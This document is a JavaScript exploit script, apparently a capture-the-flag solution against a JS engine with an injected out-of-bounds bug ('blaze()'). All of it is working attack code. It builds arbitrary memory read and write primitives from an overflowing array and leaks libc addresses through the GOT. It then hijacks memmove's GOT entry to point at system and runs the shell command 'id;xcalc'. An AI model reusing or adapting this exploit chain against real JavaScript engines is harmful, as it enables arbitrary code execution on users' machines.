//double to int
function d_to_i2(d){
         var a = new Uint32Array(new Float64Array([d]).buffer);
         return [a[1], a[0]];
 }

//int to double
 function i2_to_d(x){
     return new Float64Array(new Uint32Array([x[1], x[0]]).buffer)[0];
 }

function i2_to_hex(i2){
                var v1 = ("00000000" + i2[0].toString(16)).substr(-8);
                var v2 = ("00000000" + i2[1].toString(16)).substr(-8);
         return [v1,v2];
 }
 function p_i2(d){
        print(i2_to_hex(d_to_i2(d))[0]+i2_to_hex(d_to_i2(d))[1])
 
 }

function debug_log(x){
        return console.log("[DEBUG] "+x)
}

function hex(i2){
  return "0x" + ("00000000" + i2[0].toString(16)).slice(-8) + ("00000000" + i2[1].toString(16)).slice(-8);
}

var oob_Array=new Array(1)
oob_Array[0]=0x71717171

var uint32_Array=new Uint32Array(0x2000)
for(var i=0; i<0x2000; i=i+1) {uint32_Array[i]=0x4141414141}

oob_Array.blaze()

//find the function size tag(0x2000) from the oob array
uint32_baseaddress_offset=0
for (i=0; i<0x2000; i++)
{
        if(oob_Array[i]==0x2000)
        {
                print('uInt32Array found');
                uint32_baseaddress_offset=i+2
                break;
        }
}
// array address of the original object
// overwrite for arbitary oob
console.log("address of the buffer")
p_i2(oob_Array[uint32_baseaddress_offset]);
// emptyelelement header 
// use for de PIE
console.log("address of emptyelement")
p_i2(oob_Array[uint32_baseaddress_offset-4]);




//read memory content 
function read64(addr){
        console.log(addr);
        oob_Array[uint32_baseaddress_offset]=i2_to_d(addr);
        // return the first two block of hex of the addr
        return [uint32_Array[1],uint32_Array[0]]
}

//write memory 
function write4(addr,value){
        oob_Array[uint32_baseaddress_offset]=i2_to_d(addr);
        uint32_Array[0]=value[1];
        uint32_Array[1]=value[0];
}

//>>> hex(e.got["memmove"])
//'0x2354040'
//>>> hex(e.got["system"])
//'0x23540b0'


// on js shell, we just leak the no aslr memove
// then calculate the offset
// dont know why it did not call memmove in headless mode
fopen_got=[0,0x2354050]
fopen_leak=read64(fopen_got);
console.log("leaked fopen");
debug_log(fopen_leak)
print(hex(fopen_leak))
//libc from system libc

libc_base= [fopen_leak[0],fopen_leak[1]-0x6dd70]
system =[libc_base[0],libc_base[1]+0x45390]

//trick from saelo
var target = new Uint8Array(100);
var cmd = "id;xcalc";
for (var i = 0; i < cmd.length; i++) {
    target[i] = cmd.charCodeAt(i);
}
// got hijacking
memmove_got=[0,0x2354040]
write4(memmove_got,system)


//shell 
console.log("[+] PWNED")
target.copyWithin(0,1)

